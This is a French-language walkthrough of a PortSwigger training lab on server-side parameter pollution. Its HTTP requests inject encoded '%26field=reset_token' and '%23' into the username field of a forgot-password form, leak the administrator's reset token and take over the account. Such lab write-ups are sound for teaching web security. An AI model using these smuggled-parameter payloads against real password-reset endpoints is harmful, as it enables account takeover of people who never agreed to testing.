# Lab

https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string

## Solution

Sur la page de reset du mot de passe, on peut renseigner un nom d'utilisateur et envoyer un mail de réinitialisation de mot de passe :

```http
POST /forgot-password HTTP/2
Host: 0a0d0024042034dc869f945100c50079.web-security-academy.net
Cookie: session=83jAyneSqnOAO6U4dIreoEiJxrj4nmYJ
Content-Length: 81
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: x-www-form-urlencoded
Accept: */*
Origin: https://0a0d0024042034dc869f945100c50079.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0d0024042034dc869f945100c50079.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

csrf=Z5mUoWGhhG1MskZUvFizE6Ou9nnxica1&username=administrator
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"result":"*****@normal-user.net","type":"email"}
```

Si on essaie d'ajouter un paramètre avec `&`, on observe aucun changement.

En revanche, avec `&` encodé en `%26`, on observe que le paramètre a un impact sur la réponse :

```http
csrf=dmHDI79sypkTfv8hMC7hCKQu7HFNE2vz&username=administrator%26

{"error": "Parameter is not supported."}
```

La réponse laisse suggérer que le paramètre ajouté est interprété comme un paramètre séparé, au lieu qu'il soit interprété comme une partie du paramètre `username`.

On peut essayer de tronquer la query string côté serveur en ajoutant `#` encodé en `%23` :

```http
csrf=dmHDI79sypkTfv8hMC7hCKQu7HFNE2vz&username=administrator%23

{"error": "Field not specified."}
```

Le message nous indique que le champ `field` n'est pas spécifié.

Ce qui veut dire que côté serveur, il y a ce champ qui est ajouté à la fin de la query string.

Essayons de le spécifier nous-même :

```http
csrf=dmHDI79sypkTfv8hMC7hCKQu7HFNE2vz&username=administrator%26field=password

{"type":"ClientError","code":400,"error":"Invalid field."}
```

Le message nous indique que le champ `field` est invalide, si on essaie avec `email` :

```http
csrf=dmHDI79sypkTfv8hMC7hCKQu7HFNE2vz&username=administrator%26field=email

{"result":"*****@normal-user.net","type":"email"}
```

Dans le fichier `/static/js/forgotPassword.js` on voit : 

```js
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

On peut donc ajouter `reset_token` à la query string :

```http
csrf=dmHDI79sypkTfv8hMC7hCKQu7HFNE2vz&username=administrator%26field=reset_token

{"result":"plk1n4pugc80et7z87kovkh35zz045o5","type":"reset_token"}
```

On a obtenu le token de réinitialisation de mot de passe et on peut aller sur `/forgot-password?reset_token=plk1n4pugc80et7z87kovkh35zz045o5` pour réinitialiser le mot de passe.